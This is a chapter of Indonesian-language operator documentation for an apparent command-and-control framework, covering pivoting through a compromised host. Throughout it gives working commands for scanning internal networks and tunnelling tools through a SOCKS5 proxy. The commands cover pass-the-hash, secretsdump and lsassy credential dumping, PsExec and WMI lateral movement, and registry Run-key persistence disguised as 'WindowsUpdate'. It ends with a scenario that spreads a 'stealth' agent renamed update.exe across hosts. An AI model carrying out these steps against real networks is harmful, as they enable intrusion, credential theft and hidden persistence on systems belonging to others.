# 14 — Network & Pivoting

## Konsep Pivoting

Pivoting = menggunakan mesin yang sudah kita kendalikan (agent) sebagai "jembatan"
untuk mengakses jaringan internal yang tidak bisa diakses langsung dari mesin operator.

```
[Operator]                [Target/Agent]             [Internal Network]
172.23.0.118      ──────► 192.168.1.50      ──────►  10.0.0.0/24
(internet)                (DMZ/compromised)           (tidak bisa diakses langsung)
```

---

## Network Scan

### TCP Port Scan — `netscan`

Jalankan port scan dari posisi jaringan agent. Berguna untuk memetakan host dan service
di jaringan internal yang tidak bisa kamu scan langsung dari internet.

```
taburtuai(IP:PORT) › netscan 2703886d \
  --targets 192.168.1.0/24 \
  --ports 22,80,443,3389,445,8080,8443 \
  --wait
```

```
[+] Network scan started: 192.168.1.0/24 (256 hosts, 7 ports)

192.168.1.1   :80    OPEN   HTTP
192.168.1.1   :443   OPEN   HTTPS
192.168.1.10  :22    OPEN   SSH
192.168.1.50  :3389  OPEN   RDP      ← target kita sendiri
192.168.1.100 :445   OPEN   SMB
192.168.1.100 :3389  OPEN   RDP
192.168.1.100 :80    OPEN   HTTP
192.168.1.200 :80    OPEN   HTTP
192.168.1.200 :8080  OPEN   HTTP

[+] Scan complete. 9 open ports found on 4 hosts.
```

### Opsi Scan

```
# Scan multiple subnet
netscan 2703886d --targets 10.0.0.0/24 --targets 192.168.1.0/24 --ports 22,80,443

# Scan target spesifik
netscan 2703886d --targets 192.168.1.100 --ports 1-1024

# Dengan banner grabbing (identifikasi service)
netscan 2703886d --targets 192.168.1.0/24 --ports 80,443,22 --banners --wait

# Dengan timeout per port
netscan 2703886d --targets 10.0.0.0/24 --ports 80,443 --timeout 2 --wait
```

### Dengan Banner Grabbing

```
taburtuai(IP:PORT) › netscan 2703886d \
  --targets 192.168.1.100 \
  --ports 22,80,443,8080 \
  --banners \
  --wait
```

```
192.168.1.100 :22    OPEN   SSH     - SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
192.168.1.100 :80    OPEN   HTTP    - Apache/2.4.52 (Ubuntu)
192.168.1.100 :443   OPEN   HTTPS   - Apache/2.4.52 (Ubuntu)
192.168.1.100 :8080  OPEN   HTTP    - Tomcat/9.0.58
```

---

## ARP Scan

Temukan semua host di subnet yang sama dengan agent tanpa melakukan port scan.
ARP scan jauh lebih cepat dan tidak terdeteksi seperti port scan.

### `arpscan <id>`

```
taburtuai(IP:PORT) › arpscan 2703886d --wait
```

```
[+] ARP scan on 192.168.1.0/24...

IP              MAC                VENDOR
------------------------------------------------
192.168.1.1     aa:bb:cc:dd:ee:ff  Cisco Systems
192.168.1.10    11:22:33:44:55:66  Dell Technologies
192.168.1.50    77:88:99:aa:bb:cc  VMware (target kita)
192.168.1.100   dd:ee:ff:11:22:33  HP Enterprise
192.168.1.200   44:55:66:77:88:99  Raspberry Pi Foundation

[+] 5 hosts found.
```

### Dengan Subnet Spesifik

```
arpscan 2703886d --subnet 10.0.0.0/24 --wait
```

---

## SOCKS5 Proxy

Buat SOCKS5 proxy yang berjalan di mesin operator, dengan traffic diforward melalui
agent. Ini memungkinkan kamu menggunakan tool apa pun (browser, nmap, impacket, dll)
untuk mengakses jaringan internal target secara transparan.

### Start SOCKS5 Proxy

```
taburtuai(IP:PORT) › socks5 start 2703886d --port 1080 --wait
```

```
[+] SOCKS5 proxy started.
    Agent     : 2703886d (192.168.1.50)
    Listen    : 127.0.0.1:1080
    
[*] Configure your tools to use SOCKS5 proxy at 127.0.0.1:1080
```

### Status Proxy

```
taburtuai(IP:PORT) › socks5 status 2703886d
```

```
[+] SOCKS5 proxy status:
    State      : running
    Port       : 1080
    Connections: 3 active
    Transferred: 14.2 MB
```

### Stop Proxy

```
taburtuai(IP:PORT) › socks5 stop 2703886d --wait
[+] SOCKS5 proxy stopped.
```

---

## Menggunakan SOCKS5 dengan Tool Lain

Setelah SOCKS5 aktif, konfigurasikan tool kamu:

### Browser (Firefox)

```
Preferences → Network Settings → Manual proxy configuration
  SOCKS Host: 127.0.0.1
  Port      : 1080
  SOCKS v5  : ✓
```

Sekarang bisa akses `http://192.168.1.100` (internal server) dari browser.

### Nmap via Proxychains

```bash
# Edit /etc/proxychains4.conf
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Scan internal network via agent
proxychains nmap -sT -p 80,443,3389,445 192.168.1.100
proxychains nmap -sT -p 1-65535 192.168.1.100 --open
```

### Impacket (Pass-the-Hash, SMB, dll)

```bash
# SMB enumeration via proxy
proxychains impacket-smbclient DOMAIN/administrator:Password@192.168.1.100

# PsExec lateral movement via proxy
proxychains impacket-psexec DOMAIN/administrator:Password@192.168.1.100

# Secretsdump via proxy
proxychains impacket-secretsdump DOMAIN/administrator:Password@192.168.1.100

# Pass-the-Hash via proxy
proxychains impacket-psexec -hashes :NTLM_HASH DOMAIN/administrator@192.168.1.100
```

### CrackMapExec

```bash
# SMB scan via proxy
proxychains cme smb 192.168.1.0/24

# Dump SAM via proxy
proxychains cme smb 192.168.1.100 -u administrator -p Password -M lsassy

# Pass-the-hash
proxychains cme smb 192.168.1.100 -u administrator -H NTLM_HASH
```

### RDP (xfreerdp)

```bash
# RDP ke internal host via SOCKS5
proxychains xfreerdp /v:192.168.1.100 /u:administrator /p:Password /dynamic-resolution
```

---

## Registry Operations

Baca, tulis, dan manipulasi registry Windows dari jarak jauh.

### Baca Registry Key

```
# Baca key
taburtuai(IP:PORT) › cmd 2703886d "reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Atau via dedicated command (Phase 11)
reg read 2703886d --key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

### Tulis Registry Key

```
reg write 2703886d \
  --key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  --name "WindowsUpdate" \
  --value "C:\Users\windows\AppData\Roaming\update.exe" \
  --type REG_SZ
```

### Hapus Registry Key

```
reg delete 2703886d \
  --key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  --name "WindowsUpdate"
```

### List Subkey

```
reg list 2703886d --key "HKCU\Software\Microsoft"
```

---

## Scenario: Lateral Movement via SOCKS5

```bash
# 1. Compromise initial target, agent aktif
# 2. Enumerate jaringan internal dari posisi agent
netscan 2703886d --targets 10.0.0.0/24 --ports 445,3389,22 --wait

# 3. Identifikasi target menarik (misal: 10.0.0.100 dengan port 445 open)

# 4. Start SOCKS5 proxy
socks5 start 2703886d --port 1080

# 5. Gunakan credential yang sudah didapat untuk lateral movement
proxychains impacket-secretsdump domain/admin:pass@10.0.0.100

# 6. Atau deploy agent baru ke target baru via SMB
files upload 2703886d ./bin/agent_windows_stealth.exe "C:\Temp\update.exe"
cmd 2703886d "copy C:\Temp\update.exe \\10.0.0.100\C$\Temp\update.exe"

# 7. Eksekusi agent di target baru via WMI/SCM
cmd 2703886d "wmic /node:10.0.0.100 /user:domain\admin /password:pass process call create 'C:\Temp\update.exe'"
```

---

**Selanjutnya:** [15 — Advanced Techniques](15-advanced.md)
